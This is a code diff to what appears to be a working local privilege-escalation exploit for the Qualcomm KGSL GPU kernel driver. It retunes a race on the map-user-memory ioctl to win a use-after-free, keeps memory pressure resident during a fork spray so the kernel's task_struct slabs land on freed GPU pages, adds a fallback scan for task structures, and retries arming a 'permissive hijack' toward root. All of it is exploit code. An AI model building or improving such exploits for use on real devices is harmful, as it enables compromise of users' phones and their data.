@@ -35,6 +35,9 @@
 #ifndef MAP_FIXED_NOREPLACE
 #define MAP_FIXED_NOREPLACE 0x100000
 #endif
+#ifndef MADV_DONTFORK
+#define MADV_DONTFORK 10
+#endif
 
 #ifndef PAGE_SIZE
 #define PAGE_SIZE 0x1000UL
@@ -62,13 +65,14 @@
 
 #define MAX_CHILDREN 16384
 #define CLEANUP_BATCH 64
-#define MAX_TASK_CANDIDATES 16
+#define MAX_TASK_CANDIDATES 64
 #define SCAN_FAST_WORDS 64
 #define SCAN_FULL_WORDS (PAGE_SIZE / 8)
 #define SCAN_MAX_PAGES_PER_BATCH 2048
 #define CRED_SCAN_PAGES_PER_BATCH 256
 #define MAX_RACE_TRIES 20
-#define RACE_MMAP_TRIES 4096
+#define RACE_MMAP_TRIES 65536
+#define RACE_MMAP_BUDGET_US 50000
 #define MAX_RACERS 4
 #define SCAN_MAX_PAGES 65540
 #define SCAN_FIRST_PAGE 1
@@ -126,7 +130,12 @@ static struct ctrl *ctrls;
 static int g_child_count = 4000;
 static size_t g_pressure_bytes = 2560UL * 1024 * 1024;
 static int g_racer_count = 1;
-static int g_race_delay_us = 30;
+static int g_race_delay_us = -1;      /* < 0: sweep 0..measured ioctl time */
+static int g_race_delay_fixed;
+static int64_t g_last_ioctl_us;
+static int g_pressure_hold = 1;
+static void *g_pressure_map;
+static size_t g_pressure_size;
 static volatile int race_go;
 static int verbose = 1;
 static const struct target_profile *g_target;
@@ -306,6 +315,38 @@ static void mark(const char *label) {
     printf("[t] %s +%lldms\n", label,
            (long long)(now_ms() - g_start_ms));
 }
+static int64_t now_us(void) {
+    struct timespec ts;
+    clock_gettime(CLOCK_MONOTONIC, &ts);
+    return (int64_t)ts.tv_sec * 1000000 + ts.tv_nsec / 1000;
+}
+
+/*
+ * The overlap mmap has to land inside the kgsl_map_user_mem critical
+ * section: too early and the mmap succeeds (which also destroys the bogus
+ * hostptr mapping and invalidates the setup), too late and the ioctl is
+ * already done.  Measure the ioctl once and sweep the delay over 0..that
+ * duration on the retries instead of guessing a single value.
+ */
+static void race_delay_sleep(int us) {
+    if (us <= 0) return;
+    if (us <= 200) {
+        int64_t deadline = now_us() + us;
+        while (now_us() < deadline)
+            __asm__ volatile("yield" ::: "memory");
+        return;
+    }
+    struct timespec ts = { .tv_sec = us / 1000000,
+                           .tv_nsec = (long)(us % 1000000) * 1000L };
+    while (nanosleep(&ts, &ts) < 0 && errno == EINTR) {}
+}
+static int race_delay_for_try(int attempt) {
+    if (g_race_delay_fixed) return g_race_delay_us;
+    if (g_last_ioctl_us <= 0) return 0;
+    long long delay = g_last_ioctl_us * attempt / (MAX_RACE_TRIES - 1);
+    if (delay > 100000) delay = 100000;
+    return (int)delay;
+}
 
 static void terminate_children_and_exit(int signal_number)
 {
@@ -468,9 +509,10 @@ static int gpu_write_words(int fd, unsigned ctx, unsigned ib_id,
 
 struct race_arg {
     int fd;
-    int delay_us;
     volatile int started;
     volatile int done;
+    int64_t t0_us;
+    int64_t t1_us;
     int ret;
     int err;
 };
@@ -483,17 +525,17 @@ static void *bogus_racer(void *arg) {
                         &g_race_mask);
     }
     while (!race_go) { }
-    if (ra->delay_us > 0)
-        usleep((useconds_t)ra->delay_us);
     struct kgsl_map_user_mem req = {0};
     req.fd = -1;
     req.len = WRAP_SIZE;
     req.hostptr = BOGUS_START;
     req.memtype = KGSL_USER_MEM_TYPE_ADDR;
     req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
+    ra->t0_us = now_us();
     ra->started = 1;
     __sync_synchronize();
     int r = ioctl(ra->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
+    ra->t1_us = now_us();
     ra->ret = r;
     ra->err = errno;
     __sync_synchronize();
@@ -546,7 +588,6 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
     race_go = 0;
     for (int i = 0; i < g_racer_count && i < MAX_RACERS; i++) {
         ra[i].fd = fd;
-        ra[i].delay_us = i * 50;
         if (pthread_create(&th[i], NULL, bogus_racer, &ra[i]) != 0) {
             perror("pthread");
             break;
@@ -565,9 +606,12 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
             if (any) break;
             __asm__ volatile("yield" ::: "memory");
         }
+        int64_t budget_end = 0;
         for (int attempt = 0; attempt < RACE_MMAP_TRIES; attempt++) {
-            if (attempt == 0 && g_race_delay_us > 0)
-                usleep((useconds_t)g_race_delay_us);
+            if (attempt == 0) {
+                race_delay_sleep(g_race_delay_us);
+                budget_end = now_us() + RACE_MMAP_BUDGET_US;
+            }
             errno = 0;
             overlap_vma = mmap((void *)OVERLAP_START, overlap_mmap_size,
                                PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
@@ -589,11 +633,22 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
             for (int i = 0; i < created; i++)
                 if (!ra[i].done) { all_done = 0; break; }
             if (all_done) break;
+            if (now_us() > budget_end) break;
             __asm__ volatile("yield" ::: "memory");
         }
     }
     for (int i = 0; i < created; i++)
         pthread_join(th[i], NULL);
+
+    int64_t ioctl_us = 0;
+    for (int i = 0; i < created; i++) {
+        int64_t duration = ra[i].t1_us - ra[i].t0_us;
+        if (duration > ioctl_us) ioctl_us = duration;
+    }
+    if (ioctl_us > 0) g_last_ioctl_us = ioctl_us;
+    if (verbose && ioctl_us > 0)
+        printf("[*] racer ioctl took %lldus (mmap delay %dus)\n",
+               (long long)ioctl_us, g_race_delay_us);
 
     if (won) {
         printf("[!] RACE WON (uaf gpu=%llx)\n", (unsigned long long)uaf_gpu);
@@ -1427,7 +1482,7 @@ static int find_task_candidates(
         uint64_t ib_bytes, unsigned dump_id, uint64_t dump_gpu, void *dump_vma,
         uint64_t uaf_base, const struct target_profile *profile,
         struct found *candidates, size_t candidate_capacity,
-        size_t *candidate_count) {
+        size_t *candidate_count, int force_full) {
     if (!profile || !candidates || !candidate_capacity || !candidate_count) {
         errno = EINVAL;
         return -1;
@@ -1449,7 +1504,8 @@ static int find_task_candidates(
     const char *diagnostics_env = getenv("KGSL_SCAN_DIAGNOSTICS");
     int diagnostics = diagnostics_env && strcmp(diagnostics_env, "1") == 0;
     const char *full_scan_env = getenv("KGSL_SCAN_FULL");
-    int full_scan = full_scan_env && strcmp(full_scan_env, "1") == 0;
+    int full_scan = force_full ||
+                    (full_scan_env && strcmp(full_scan_env, "1") == 0);
     size_t words_per_page = full_scan ? SCAN_FULL_WORDS : SCAN_FAST_WORDS;
     size_t pages_per_batch = KM_DUMP_BUFFER_SIZE / (words_per_page * 8);
     if (pages_per_batch > SCAN_MAX_PAGES_PER_BATCH)
@@ -2014,24 +2070,48 @@ static int restore_parent_affinity(void) {
     return sched_setaffinity(0, sizeof(g_allowed_cpus), &g_allowed_cpus);
 }
 
-static void drain_kgsl_pool(void) {
+/*
+ * The pressure forces the KGSL pool shrinker to return the freed object's
+ * pages.  Unmapping it again before the fork spray puts all those pages back
+ * on top of the free lists, so the task_struct slabs tend to take pressure
+ * pages instead of the freed GPU ones.  Keeping it resident across the fork
+ * (KGSL_PRESSURE_HOLD=1) makes the spray allocate from what is left free.
+ * MADV_DONTFORK keeps the 8k children from copying the mapping's page
+ * tables, which would otherwise dwarf the spray itself.
+ */
+static void apply_kgsl_pressure(void) {
+    if (!g_pressure_bytes || g_pressure_map) return;
     printf("[*] memory pressure to drain KGSL pool\n");
-    if (!g_pressure_bytes) return;
-    volatile unsigned char *pressure_map = mmap(NULL, g_pressure_bytes,
+    void *pressure_map = mmap(NULL, g_pressure_bytes,
         PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     if (pressure_map == MAP_FAILED) {
         perror("pressure mmap");
         return;
     }
     for (size_t off = 0; off < g_pressure_bytes; off += PAGE_SIZE)
-        pressure_map[off] = 1;
-    munmap((void *)pressure_map, g_pressure_bytes);
-    printf("[+] pressure done\n");
+        ((volatile unsigned char *)pressure_map)[off] = 1;
+    if (madvise(pressure_map, g_pressure_bytes, MADV_DONTFORK) < 0) {
+        perror("pressure MADV_DONTFORK");
+        munmap(pressure_map, g_pressure_bytes);
+        return;
+    }
+    g_pressure_map = pressure_map;
+    g_pressure_size = g_pressure_bytes;
+    printf("[+] pressure %zu MiB resident\n", g_pressure_size >> 20);
+}
+
+static void release_kgsl_pressure(void) {
+    if (!g_pressure_map) return;
+    munmap(g_pressure_map, g_pressure_size);
+    g_pressure_map = NULL;
+    g_pressure_size = 0;
+    printf("[*] pressure released\n");
 }
 
 /* Drop everything a failed round owns so the next one starts clean. */
 static void abandon_round(int *fd, unsigned *ib_id, void **ib_vma,
                           unsigned *dump_id, void **dump_vma) {
+    release_kgsl_pressure();
     if (*ib_vma) {
         munmap(*ib_vma, IB_SIZE);
         *ib_vma = NULL;
@@ -2196,13 +2276,20 @@ int main(int argc, char **argv) {
         fprintf(stderr, "[-] KGSL_RACE_DELAY_US must be between 0 and 100000\n");
         return 2;
     }
-    if (env_status > 0)
+    if (env_status > 0) {
         g_race_delay_us = (int)configured_delay;
+        g_race_delay_fixed = 1;
+    }
+    g_pressure_hold = env_flag("KGSL_PRESSURE_HOLD", 1);
     if (!children_set || !pressure_set)
         choose_spray_defaults(children_set, pressure_set);
-    printf("[*] spray profile children=%d pressure=%zu MiB racers=%d delay=%dus\n",
-           g_child_count, g_pressure_bytes / (1024 * 1024), g_racer_count,
-           g_race_delay_us);
+    printf("[*] spray profile children=%d pressure=%zu MiB racers=%d delay=",
+           g_child_count, g_pressure_bytes / (1024 * 1024), g_racer_count);
+    if (g_race_delay_fixed)
+        printf("%dus\n", g_race_delay_us);
+    else
+        printf("auto-sweep\n");
+    printf("[*] pressure hold=%d\n", g_pressure_hold);
     if (sec_sid_mode && getenv("SEC_LOG")) {
         void *log = mmap(NULL, SEC_LOG_SIZE, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
@@ -2268,9 +2355,11 @@ int main(int argc, char **argv) {
         }
 
         for (int attempt = 0; attempt < MAX_RACE_TRIES; attempt++) {
-            printf("[*] race try %d\n", attempt + 1);
+            g_race_delay_us = race_delay_for_try(attempt);
+            printf("[*] race try %d delay=%dus\n", attempt + 1,
+                   g_race_delay_us);
             if (race_once(&fd, &uaf_gpu) == 0) break;
-            usleep(200000);
+            usleep(20000);
         }
         if (fd < 0) {
             fprintf(stderr, "[-] race not won\n");
@@ -2279,11 +2368,15 @@ int main(int argc, char **argv) {
         }
         mark("race won");
 
-        drain_kgsl_pool();
+        apply_kgsl_pressure();
+        if (!g_pressure_hold)
+            release_kgsl_pressure();
         mark("pressure done");
 
         printf("[*] spraying children\n");
         spray_children(fd);
+        if (g_pressure_hold)
+            release_kgsl_pressure();
         if (restore_parent_affinity() < 0) {
             perror("restore parent CPU affinity");
             abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
@@ -2293,7 +2386,7 @@ int main(int argc, char **argv) {
         for (int i = 0; i < g_child_count; i++)
             if (ctrls[i].pid > 0) alive++;
         printf("[*] children=%d\n", alive);
-        if (alive == 0 || wait_children_ready(alive, 30000) < 0) {
+        if (alive == 0 || wait_children_ready(alive, 60000) < 0) {
             fprintf(stderr, "[-] spray incomplete\n");
             abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
             continue;
@@ -2308,11 +2401,22 @@ int main(int argc, char **argv) {
             continue;
         }
 
-        if (find_task_candidates(
+        int found = find_task_candidates(
                 fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                 dump_id, dump_gpu, dump_vma, uaf_gpu, g_target,
                 task_candidates, MAX_TASK_CANDIDATES,
-                &task_candidate_count) < 0) {
+                &task_candidate_count, 0);
+        if (found < 0 && !getenv("KGSL_SCAN_FULL")) {
+            fprintf(stderr,
+                    "[*] fast scan found nothing; retrying with full scan\n");
+            task_candidate_count = 0;
+            found = find_task_candidates(
+                    fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
+                    dump_id, dump_gpu, dump_vma, uaf_gpu, g_target,
+                    task_candidates, MAX_TASK_CANDIDATES,
+                    &task_candidate_count, 1);
+        }
+        if (found < 0) {
             fprintf(stderr, "[-] task_struct not found\n");
             abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
             continue;
@@ -2434,10 +2538,16 @@ int main(int argc, char **argv) {
     }
     uint64_t hijack_kaslr = 0;
     if (sec_perm_mode) {
-        hijack_kaslr = sec_perm_arm(fd, ctx, ib_id, ib_gpu, ib_vma,
-                                    dump_id, dump_gpu, dump_vma,
-                                    &root_child, root_task_kva,
-                                    env_flag("SEC_PERM_TRIGGER", 1));
+        int trigger = env_flag("SEC_PERM_TRIGGER", 1);
+        for (int arm = 0; arm < 3 && !hijack_kaslr; arm++) {
+            hijack_kaslr = sec_perm_arm(fd, ctx, ib_id, ib_gpu, ib_vma,
+                                        dump_id, dump_gpu, dump_vma,
+                                        &root_child, root_task_kva, trigger);
+            if (!hijack_kaslr && !trigger)
+                break;
+            if (!hijack_kaslr)
+                usleep(1000);
+        }
         if (!hijack_kaslr)
             fprintf(stderr,
                     "[-] permissive hijack not armed; child will resume"
